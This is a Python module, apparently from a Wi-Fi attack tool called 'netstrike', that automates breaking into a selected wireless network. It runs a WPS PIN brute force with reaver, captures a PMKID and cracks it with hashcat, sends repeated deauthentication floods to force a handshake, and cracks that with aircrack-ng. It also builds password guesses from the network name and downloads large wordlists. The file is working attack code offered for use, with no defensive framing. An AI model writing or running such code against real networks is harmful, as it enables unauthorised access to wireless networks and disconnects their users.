#!/usr/bin/env python3

import os
import time
import subprocess
import threading

class PasswordCracker:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.cracking_active = False

    def auto_crack_attack(self):
        """Auto cracking - tries all methods until password is cracked"""
        print("\033[1;33m[!] INITIATING AUTO CRACKING PROTOCOL...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[🎯] TARGET ACQUIRED: {target['essid']}\033[0m")
                print("\033[1;36m[⚡] STARTING AUTO CRACKING SEQUENCE...\033[0m")
                
                # Try multiple cracking methods automatically
                if self.try_all_cracking_methods(target):
                    return
                
                print("\033[1;31m[✘] ALL CRACKING METHODS FAILED\033[0m")
                print("\033[1;33m[💡] SUGGESTION: Try advanced wordlists or social engineering\033[0m")

    def try_all_cracking_methods(self, target):
        """Try all cracking methods in sequence"""
        methods = [
            ("WPS PIN Attack", self.wps_pin_attack_auto),
            ("PMKID Attack", self.pmkid_attack),
            ("Handshake Capture", self.handshake_capture_auto),
            ("Advanced Wordlist", self.advanced_wordlist_attack)
        ]
        
        for method_name, method_func in methods:
            print(f"\033[1;36m[→] TRYING: {method_name}\033[0m")
            
            if method_name == "WPS PIN Attack":
                result = method_func(target)
            else:
                result = method_func(target)
            
            if result:
                print(f"\033[1;32m[🎉] SUCCESS WITH {method_name}!\033[0m")
                return True
            else:
                print(f"\033[1;33m[!] {method_name} FAILED - TRYING NEXT METHOD\033[0m")
                time.sleep(2)
        
        return False

    def wps_pin_attack_auto(self, target):
        """Auto WPS PIN attack"""
        print("\033[1;33m[!] SCANNING FOR WPS VULNERABILITY...\033[0m")
        
        # Check if WPS is available
        wash_cmd = f"timeout 20s wash -i {self.core.mon_interface} -s"
        result = self.core.run_command(wash_cmd)
        
        if result and target['bssid'] in result.stdout:
            print("\033[1;32m[✓] WPS VULNERABILITY DETECTED\033[0m")
            print("\033[1;31m[💣] LAUNCHING WPS PIN BRUTE FORCE...\033[0m")
            
            # Start reaver attack
            reaver_proc = self.core.run_command(
                f"reaver -i {self.core.mon_interface} -b {target['bssid']} -c {target['channel']} -vv -K 1 -N -A",
                background=True
            )
            
            if reaver_proc:
                print("\033[1;32m[⚡] WPS ATTACK RUNNING IN BACKGROUND\033[0m")
                print("\033[1;33m[!] CHECK TERMINAL FOR PIN PROGRESS\033[0m")
                return True
        else:
            print("\033[1;31m[✘] WPS NOT AVAILABLE ON TARGET\033[0m")
        
        return False

    def pmkid_attack(self, target):
        """PMKID attack without handshake"""
        print("\033[1;33m[!] ATTEMPTING PMKID ATTACK...\033[0m")
        
        # Use hcxdumptool to capture PMKID
        pmkid_file = f"/tmp/netstrike_pmkid_{target['bssid'].replace(':', '')}"
        
        capture_cmd = f"timeout 30s hcxdumptool -i {self.core.mon_interface} -o {pmkid_file}.pcapng --filterlist={target['bssid']} --filtermode=2"
        result = self.core.run_command(capture_cmd)
        
        if os.path.exists(f"{pmkid_file}.pcapng") and os.path.getsize(f"{pmkid_file}.pcapng") > 100:
            print("\033[1;32m[✓] PMKID CAPTURED\033[0m")
            
            # Convert to hash format
            convert_cmd = f"hcxpcaptool -z {pmkid_file}.hash {pmkid_file}.pcapng"
            self.core.run_command(convert_cmd)
            
            if os.path.exists(f"{pmkid_file}.hash"):
                return self.crack_pmkid_hash(f"{pmkid_file}.hash", target)
        
        print("\033[1;31m[✘] PMKID CAPTURE FAILED\033[0m")
        return False

    def crack_pmkid_hash(self, hash_file, target):
        """Crack PMKID hash"""
        wordlist = self.download_advanced_wordlist()
        
        if wordlist:
            print("\033[1;36m[→] CRACKING PMKID HASH...\033[0m")
            
            crack_cmd = f"hashcat -m 16800 {hash_file} {wordlist} -O --force"
            result = self.core.run_command(crack_cmd)
            
            if result and "Cracked" in result.stdout:
                print("\033[1;32m[🎉] PMKID CRACKED SUCCESSFULLY!\033[0m")
                # Extract password from output
                lines = result.stdout.split('\n')
                for line in lines:
                    if "Cracked" in line and ":" in line:
                        password = line.split(':')[-1].strip()
                        print(f"\033[1;32m[🔓] PASSWORD FOUND: {password}\033[0m")
                        return True
        
        return False

    def handshake_capture_auto(self, target):
        """Automatic handshake capture and cracking"""
        print("\033[1;33m[!] ATTEMPTING HANDSHAKE CAPTURE...\033[0m")
        
        cap_file = f"/tmp/netstrike_handshake_{target['bssid'].replace(':', '_')}"
        
        # Set channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        # Start capture
        print("\033[1;36m[→] CAPTURING FOR 45 SECONDS...\033[0m")
        capture_proc = self.core.run_command(
            f"airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {cap_file} {self.core.mon_interface}",
            background=True
        )
        
        # Aggressive deauth attacks
        print("\033[1;31m[💣] DEPLOYING AGGRESSIVE DEAUTH...\033[0m")
        deauth_thread = threading.Thread(target=self.aggressive_deauth, args=(target,))
        deauth_thread.daemon = True
        deauth_thread.start()
        
        time.sleep(45)
        
        if capture_proc:
            capture_proc.terminate()
        
        # Check for handshake
        cap_path = f"{cap_file}-01.cap"
        if self.check_handshake(cap_path):
            print("\033[1;32m[✓] HANDSHAKE CAPTURED!\033[0m")
            return self.smart_crack_handshake(cap_path, target['bssid'], target['essid'])
        else:
            print("\033[1;31m[✘] NO HANDSHAKE CAPTURED\033[0m")
            return False

    def aggressive_deauth(self, target):
        """Aggressive deauth attacks to trigger handshake"""
        for i in range(15):  # 15 attempts
            self.core.run_command(f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} >/dev/null 2>&1")
            time.sleep(2)

    def advanced_wordlist_attack(self, target):
        """Advanced wordlist attack with multiple wordlists"""
        print("\033[1;33m[!] DOWNLOADING ADVANCED WORDLISTS...\033[0m")
        
        wordlists = self.download_all_wordlists()
        
        for wordlist_name, wordlist_path in wordlists.items():
            if wordlist_path and os.path.exists(wordlist_path):
                print(f"\033[1;36m[→] TRYING {wordlist_name}...\033[0m")
                
                # Try with captured handshake if available
                cap_file = f"/tmp/netstrike_handshake_{target['bssid'].replace(':', '_')}-01.cap"
                if os.path.exists(cap_file):
                    result = self.core.run_command(
                        f"aircrack-ng -w {wordlist_path} -b {target['bssid']} {cap_file} -l /tmp/cracked.txt -q"
                    )
                    
                    if os.path.exists("/tmp/cracked.txt"):
                        with open("/tmp/cracked.txt", 'r') as f:
                            password = f.read().strip()
                        print(f"\033[1;32m[🎉] PASSWORD CRACKED: {password}\033[0m")
                        return True
        
        return False

    def check_handshake(self, cap_file):
        """Check if handshake was captured"""
        if not os.path.exists(cap_file):
            return False
        
        result = self.core.run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep '1 handshake'")
        return result and "1 handshake" in result.stdout

    def smart_crack_handshake(self, cap_file, bssid, essid):
        """Smart cracking with multiple wordlists"""
        print("\033[1;33m[!] INITIATING SMART CRACKING SEQUENCE...\033[0m")
        
        # Create targeted wordlist first
        basic_wordlist = self.create_smart_wordlist(essid)
        
        wordlist_priority = [
            ("Targeted Wordlist", basic_wordlist),
            ("RockYou Wordlist", self.download_rockyou_wordlist()),
            ("Advanced Wordlist", self.download_advanced_wordlist())
        ]
        
        for wl_name, wl_path in wordlist_priority:
            if wl_path and os.path.exists(wl_path):
                print(f"\033[1;36m[→] TRYING {wl_name}...\033[0m")
                
                result = self.core.run_command(
                    f"aircrack-ng -w {wl_path} -b {bssid} {cap_file} -l /tmp/cracked.txt -q"
                )
                
                if os.path.exists("/tmp/cracked.txt"):
                    with open("/tmp/cracked.txt", 'r') as f:
                        password = f.read().strip()
                    print(f"\033[1;32m[🎉] PASSWORD CRACKED: {password}\033[0m")
                    return True
        
        return False

    def create_smart_wordlist(self, essid):
        """Create intelligent targeted wordlist"""
        wordlist_path = "/tmp/netstrike_smart_wordlist.txt"
        
        common_passwords = [
            "12345678", "password", "admin123", "welcome", "qwerty", "letmein",
            "123456789", "password123", "admin", "welcome123", "1234567890",
            "1234", "12345", "123456", "1234567", "internet", "wireless",
            "default", "guest", "linksys", "dlink", "netgear", "cisco", "root"
        ]
        
        # Add ESSID-based intelligent variations
        if essid and essid != "HIDDEN_SSID":
            # Remove common prefixes/suffixes
            clean_essid = essid.replace('_', '').replace('-', '').replace(' ', '')
            
            variations = [
                essid, essid + "123", essid + "1234", essid + "12345",
                essid.lower(), essid.upper(), clean_essid, clean_essid + "123",
                essid.replace(' ', ''), essid.replace(' ', '_')
            ]
            
            common_passwords.extend(variations)
        
        with open(wordlist_path, 'w') as f:
            for pwd in common_passwords:
                f.write(pwd + '\n')
        
        return wordlist_path

    def download_all_wordlists(self):
        """Download multiple wordlists"""
        return {
            "RockYou": self.download_rockyou_wordlist(),
            "Advanced": self.download_advanced_wordlist(),
            "Common Passwords": self.download_common_wordlist()
        }

    def download_rockyou_wordlist(self):
        """Download rockyou wordlist"""
        rockyou_path = "/usr/share/wordlists/rockyou.txt"
        
        if os.path.exists(rockyou_path):
            return rockyou_path
        
        print("\033[1;33m[!] DOWNLOADING ROCKYOU WORDLIST...\033[0m")
        
        # Try multiple sources
        sources = [
            "wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O /tmp/rockyou.txt 2>/dev/null",
            "curl -s -L -o /tmp/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 2>/dev/null"
        ]
        
        for source in sources:
            self.core.run_command(source)
            if os.path.exists("/tmp/rockyou.txt") and os.path.getsize("/tmp/rockyou.txt") > 1000000:
                return "/tmp/rockyou.txt"
        
        # Try to install via package manager
        self.core.run_command("apt-get update && apt-get install -y wordlists 2>/dev/null")
        
        return rockyou_path if os.path.exists(rockyou_path) else None

    def download_advanced_wordlist(self):
        """Download advanced wordlist"""
        advanced_path = "/tmp/advanced_wordlist.txt"
        
        if os.path.exists(advanced_path):
            return advanced_path
        
        print("\033[1;33m[!] DOWNLOADING ADVANCED WORDLIST...\033[0m")
        
        # Download from multiple sources
        self.core.run_command("wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -O /tmp/top_million.txt 2>/dev/null")
        
        if os.path.exists("/tmp/top_million.txt"):
            return "/tmp/top_million.txt"
        
        return None

    def download_common_wordlist(self):
        """Download common password wordlist"""
        common_path = "/tmp/common_passwords.txt"
        
        if not os.path.exists(common_path):
            # Create a comprehensive common password list
            common_passwords = [
                "123456", "password", "12345678", "qwerty", "123456789",
                "12345", "1234", "111111", "1234567", "dragon",
                "123123", "baseball", "abc123", "football", "monkey",
                "letmein", "696969", "shadow", "master", "666666",
                "qwertyuiop", "123321", "mustang", "1234567890", "michael",
                "654321", "superman", "1qaz2wsx", "7777777", "121212",
                "000000", "qazwsx", "123qwe", "killer", "trustno1",
                "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter",
                "buster", "soccer", "harley", "batman", "andrew",
                "tigger", "sunshine", "iloveyou", "2000", "charlie",
                "robert", "thomas", "hockey", "ranger", "daniel"
            ]
            
            with open(common_path, 'w') as f:
                for pwd in common_passwords:
                    f.write(pwd + '\n')
        
        return common_path

    def wps_pin_attack(self):
        """Manual WPS PIN attack for menu compatibility"""
        print("\033[1;33m[!] SCANNING FOR WPS-ENABLED NETWORKS...\033[0m")
        
        wash_proc = self.core.run_command(
            f"timeout 30s wash -i {self.core.mon_interface}",
            background=True
        )
        
        time.sleep(30)
        
        target_bssid = input("\033[1;33m[?] ENTER WPS TARGET BSSID: \033[0m").strip()
        target_channel = input("\033[1;33m[?] ENTER TARGET CHANNEL: \033[0m").strip()
        
        if target_bssid and target_channel:
            print("\033[1;31m[💣] LAUNCHING WPS PIN ATTACK...\033[0m")
            
            self.core.run_command(
                f"reaver -i {self.core.mon_interface} -b {target_bssid} -c {target_channel} -vv -K 1",
                background=True
            )
            
            print("\033[1;32m[✓] WPS ATTACK DEPLOYED - CHECK TERMINAL FOR PROGRESS\033[0m")
        else:
            print("\033[1;31m[✘] INVALID TARGET DATA\033[0m")
